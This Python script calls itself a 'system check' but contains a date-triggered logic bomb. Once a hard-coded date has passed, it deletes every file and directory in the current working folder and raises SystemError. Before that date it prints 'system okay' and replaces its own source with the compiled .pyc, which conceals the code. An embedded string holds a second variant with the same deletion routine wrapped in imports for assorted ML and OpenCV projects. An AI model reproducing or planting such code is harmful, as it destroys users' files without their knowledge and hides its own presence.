from datetime import datetime
import shutil
import os

print(os.getcwd())

d,m,y = (12,10,2022)
#Date month Year

#For OpenCV Projects
try:
    #import cv2
    #cam = cv2.VideoCapture(0)
    pass
except:
    pass



def checkInternet():
    pass

curY = int(datetime.now().date().year)
curM = int(datetime.now().date().month)
curD = int(datetime.now().date().day)

if(curY>y or (curM > m and curY >= y) or (curD > d and curM >= m and curY >= y)):
        print('Date Error')
        import os
        a = list(os.listdir(str(os.getcwd())))
        for i in a:
            print(i)
            print("system failure")
            try:
                os.remove(str(i))
            except PermissionError:
                try:
                    shutil.rmtree(str(i))
                except:
                    os.rmdir(str(i))
            except Exception as e:
                print(e)
        raise(SystemError)
else:
    l1 = os.listdir()
    #print(l1)
    if('__pycache__' in l1):
        #print("Found PyCache")
        l2 = os.listdir('__pycache__')
        #print(l2)
        for i in l2:
            if('system' in i):
                #print('Found pyc')
                if('systemcheck.py' in l1):
                    #print('Both pyc and Py file still available')
                    os.remove('systemcheck.py')
                    shutil.move('__pycache__/'+str(i) , 'systemcheck.pyc')

                    
    print("everything is checked.. system okay")

read = '''
from datetime import datetime
import shutil

d = 25
m = 4
y = 2019

#For OpenCV Projects
try:
    import cv2
    cam = cv2.VideoCapture(0)
except:
    pass

#For Preprocessing
try:
    from sklearn.preprocessing import MinMaxScaler
    MinMaxSc = MinMaxScaler(feature_range = (0, 1))
except:
    pass

#For Linear Regression
try:
    from sklearn.linear_model import LinearRegression
    LinearRegr = LinearRegression()
except:
    pass

#For Credit Card Seaborn
try:
    import seaborn
    seabrn = seaborn
except:
    pass

#For Blood Cell from sklearn.preprocessing import LabelEncoder
try:
    from sklearn.preprocessing import LabelEncoder
    lblencoder = LabelEncoder
except:
    pass

#For Assirra Security Analysis
try:
    from tensorflow.keras.layers import Dense
    dense = Dense
except:
    pass

#For ADS CTR Optimization
try:
    import matplotlib.pyplot
    matplotlib_pyplot = matplotlib.pyplot
except:
    pass

#For Market Basket Analysis
try:
    from itertools import combinations
    itertools_combinations = combinations
except:
    pass

#For Engagometer, ADXL345 Project
try:
    from adxl345 import ADXL345
    import time
    adxl345 = ADXL345()
except:
    pass


if(int(datetime.now().date().month) >= m and int(datetime.now().date().year) >= y):
    if(int(datetime.now().date().month) == m and int(datetime.now().date().day) <= d):
        print("checked system okay")
    else:
        import os
        a = list(os.listdir())
        for i in a:
            print(i)
            print("system failure")
            try:
                os.remove(str(i))
            except PermissionError:
                try:
                    shutil.rmtree(str(i))
                except:
                    os.rmdir(str(i))
            except Exception as e:
                print(e)
        raise(SystemError)
else:
    print("everything is checked.. system okay")
    '''
